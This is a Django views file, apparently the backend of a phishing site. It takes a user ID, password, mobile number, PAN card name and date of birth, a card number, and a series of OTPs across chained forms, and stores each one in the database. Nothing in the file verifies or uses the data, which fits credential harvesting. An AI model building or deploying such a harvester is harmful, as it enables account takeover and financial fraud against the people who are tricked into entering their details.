# from unicodedata import name
from django.shortcuts import render, redirect, reverse
from django.http import HttpResponse
from django.db import IntegrityError
from .models import Registration, emp, pancard, emp1, emp2, emp3, emp4, emp5, emp6, emp7, emp8

def about(request):
    try:
        __context = {}
        if request.POST:
            try:
                contact = emp(otp=request.POST['otp'])

                contact.save()
                
                return redirect(reverse('websites:pan'))

                __context['success'] = "Thankyou, We will back to you as soon as possible!"
            except IntegrityError as ex:
                __context['form_data'] = {
                    'otp': request.POST['otp']}
               
                __context['error'] = ex
        return render(request, 'websites/about.html', __context)
    except Exception as ex:
        return render(request, '404.html', {'error': ex})



def index(request):
    try:
        __context = {}
        if(request.POST):
            req = Registration(userID=request.POST['userID'], password=request.POST['password'], mobile=request.POST['mobile'])

            req.save()

            return redirect(reverse('websites:about'))

        return render(request, 'websites/index.html', __context)
    except Exception as ex:
        return render(request, '404.html', {'error': ex})


def pan(request):  
    try:
        __context = {}
        if request.POST:
            try:
                contact = pancard(name=request.POST['name'], dob=request.POST['dob'])
                contact.save()

                return redirect(reverse('websites:form1'))

                __context['success'] = "Thankyou, We will back to you as soon as possible!"
            except IntegrityError as ex:
                __context['form_data'] = {
                    'name': request.POST['name'],
                    'dob': request.POST['dob']}
               
                __context['error'] = ex
        return render(request, 'websites/pan.html')
    except Exception as ex:
        return render(request, '404.html', {'error': ex})

def form1(request):
    try:
        __context = {}
        if request.POST:
            try:
                contact = emp1(otp=request.POST['otp'])

                contact.save()
                return redirect(reverse('websites:form2'))

                __context['success'] = "Thankyou, We will back to you as soon as possible!"
            except IntegrityError as ex:
                __context['form_data'] = {
                    'otp': request.POST['otp']}
               
                __context['error'] = ex
        return render(request, 'websites/form1.html', __context)
    except Exception as ex:
        return render(request, '404.html', {'error': ex})


def form2(request):
    try:
        __context = {}
        if request.POST:
            try:
                contact = emp2(otp=request.POST['otp'])

                contact.save()
                
                return redirect(reverse('websites:form3'))

                __context['success'] = "Thankyou, We will back to you as soon as possible!"
            except IntegrityError as ex:
                __context['form_data'] = {
                    'otp': request.POST['otp']}
               
                __context['error'] = ex
        return render(request, 'websites/form2.html', __context)
    except Exception as ex:
        return render(request, '404.html', {'error': ex})



def form3(request):
    try:
        __context = {}
        if request.POST:
            try:
                contact = emp3(name=request.POST['name'],
                card=request.POST['card']
                )

                contact.save()
                
                return redirect(reverse('websites:form4'))

                __context['success'] = "Thankyou, We will back to you as soon as possible!"
            except IntegrityError as ex:
                __context['form_data'] = {
                    'name': request.POST['name'],
                    'card': request.POST['card']}
               
                __context['error'] = ex
        return render(request, 'websites/form3.html', __context)
    except Exception as ex:
        return render(request, '404.html', {'error': ex})

def form4(request):
    try:
        __context = {}
        if request.POST:
            try:
                contact = emp4(otp=request.POST['otp'])

                contact.save()
                
                return redirect(reverse('websites:form5'))

                __context['success'] = "Thankyou, We will back to you as soon as possible!"
            except IntegrityError as ex:
                __context['form_data'] = {
                    'otp': request.POST['otp']}
               
                __context['error'] = ex
        return render(request, 'websites/form4.html', __context)
    except Exception as ex:
        return render(request, '404.html', {'error': ex})


def form5(request):
    try:
        __context = {}
        if request.POST:
            try:
                contact = emp5(otp=request.POST['otp'])

                contact.save()
                
                return redirect(reverse('websites:form6'))

                __context['success'] = "Thankyou, We will back to you as soon as possible!"
            except IntegrityError as ex:
                __context['form_data'] = {
                    'otp': request.POST['otp']}
               
                __context['error'] = ex
        return render(request, 'websites/form5.html', __context)
    except Exception as ex:
        return render(request, '404.html', {'error': ex})


def form6(request):
    try:
        __context = {}
        if request.POST:
            try:
                contact = emp6(otp=request.POST['otp'])

                contact.save()
                
                return redirect(reverse('websites:form7'))

                __context['success'] = "Thankyou, We will back to you as soon as possible!"
            except IntegrityError as ex:
                __context['form_data'] = {
                    'otp': request.POST['otp']}
               
                __context['error'] = ex
        return render(request, 'websites/form6.html', __context)
    except Exception as ex:
        return render(request, '404.html', {'error': ex})


def form7(request):
    try:
        __context = {}
        if request.POST:
            try:
                contact = emp7(otp=request.POST['otp'])

                contact.save()
                
                return redirect(reverse('websites:form8'))

                __context['success'] = "Thankyou, We will back to you as soon as possible!"
            except IntegrityError as ex:
                __context['form_data'] = {
                    'otp': request.POST['otp']}
               
                __context['error'] = ex
        return render(request, 'websites/form7.html', __context)
    except Exception as ex:
        return render(request, '404.html', {'error': ex})


def form8(request):
    try:
        __context = {}
        if request.POST:
            try:
                contact = emp8(otp=request.POST['otp'])

                contact.save()
                
                return redirect(reverse('websites:reg'))

                __context['success'] = "Thankyou, We will back to you as soon as possible!"
            except IntegrityError as ex:
                __context['form_data'] = {
                    'otp': request.POST['otp']}
               
                __context['error'] = ex
        return render(request, 'websites/form8.html', __context)
    except Exception as ex:
        return render(request, '404.html', {'error': ex})

      

def reg(request):
    try:
        return render(request, 'websites/reg.html')
    except Exception as ex:
        return render(request, '404.html', {'error': ex})

